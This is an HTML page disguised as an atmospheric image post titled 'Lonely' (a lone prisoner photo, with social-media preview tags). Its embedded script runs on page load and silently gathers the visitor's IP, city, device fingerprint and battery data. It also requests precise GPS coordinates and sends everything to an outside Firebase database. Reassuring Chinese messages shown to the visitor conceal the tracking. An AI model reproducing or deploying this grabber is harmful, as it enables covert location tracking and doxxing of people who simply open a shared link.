<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lonely</title>

    <!-- Open Graph / Social Media Meta Tags -->
    <meta property="og:title" content="Lonely" />
    <meta property="og:description" content="A captivating image reflecting solitude and introspection, combined with location logging functionality. Click to explore more." />
    <meta property="og:url" content="https://koko17-stack.github.io/MISSCOOL/" />
    <meta property="og:image" content="https://raw.githubusercontent.com/KOKO17-stack/MISSCOOL/main/alone%20prisoner.jpg" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:type" content="website" />

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Prevents scrollbars if image slightly overflows */
            position: relative; /* Needed for absolute positioning of status messages */
        }

        .container-link {
            display: block;
            width: 100%;
            height: 100%;
            text-decoration: none;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1; /* Ensure the link is clickable */
        }

        .hero-image {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Ensures the image covers the area without distortion */
            display: block;
        }

        #logger-status {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2; /* Ensure messages are on top of the image */
            background-color: rgba(0, 0, 0, 0.7);
            color: #fff;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            max-width: 80%;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        #logger-status h1, #logger-status h2, #logger-status p {
            margin: 0 0 10px 0;
            color: inherit;
        }

        #logger-status h1 {
            font-size: 1.8rem;
        }

        #logger-status p {
            font-size: 1rem;
            color: #ccc;
        }

        .success {
            color: #28a745;
            font-weight: bold;
        }

        .error {
            color: #dc3545;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <a href="https://koko17-stack.github.io/MISSCOOL/" class="container-link">
        <img src="https://raw.githubusercontent.com/KOKO17-stack/MISSCOOL/main/alone%20prisoner.jpg" 
             alt="A lone prisoner in a desolate setting, evoking feelings of solitude." 
             class="hero-image">
    </a>

    <div id="logger-status">
        <h1 id="heading">请稍等，正在加载您的位置...</h1>
        <p id="subtitle">这只需要一点时间。</p>
    </div>

    <script>
        const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";

        async function logLocation() {
            const loggerStatusDiv = document.getElementById("logger-status");
            
            const payload = {
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery_level: null,
                battery_charging: null,
                screen_width: screen.width,
                screen_height: screen.height,
                connection_type: navigator.connection ? navigator.connection.effectiveType : null,
                downlink_speed_mbps: navigator.connection ? navigator.connection.downlink : null,
                device_latitude: null,
                device_longitude: null,
                device_accuracy_meters: null,
                ip: "unavailable",
                city: "unknown",
                region: "unknown",
                country: "unknown"
            };

            // Battery info
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    payload.battery_level = Math.round(battery.level * 100);
                    payload.battery_charging = battery.charging;
                } catch (e) {
                    console.error("Error getting battery info:", e);
                }
            }

            // GPS (requires user to tap Allow)
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    payload.device_latitude = pos.coords.latitude;
                    payload.device_longitude = pos.coords.longitude;
                    payload.device_accuracy_meters = pos.coords.accuracy;
                } catch (e) {
                    console.error("Error getting geolocation:", e);
                }
            }

            // IP info (silent)
            try {
                const res = await fetch("https://ipapi.co/json");
                if (res.ok) {
                    const data = await res.json();
                    payload.ip = data.ip || "unavailable";
                    payload.city = data.city || "unknown";
                    payload.region = data.region || "unknown";
                    payload.country = data.country_name || "unknown";
                } else {
                    console.warn("IP API request failed with status:", res.status);
                }
            } catch (e) {
                console.error("Error fetching IP info:", e);
            }

            // Send to Firebase
            try {
                const firebaseRes = await fetch(FIREBASE_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                if (firebaseRes.ok) {
                    loggerStatusDiv.innerHTML = `<h2 class="success">谢谢！现在一切都很好 ❤️</h2>`;
                } else {
                    console.error("Firebase request failed with status:", firebaseRes.status, await firebaseRes.text());
                    loggerStatusDiv.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
                }
            } catch (e) {
                console.error("Error sending data to Firebase:", e);
                loggerStatusDiv.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
            }
        }

        // Start the script once the page is fully loaded
        document.addEventListener("DOMContentLoaded", logLocation);
    </script>
</body>
</html>
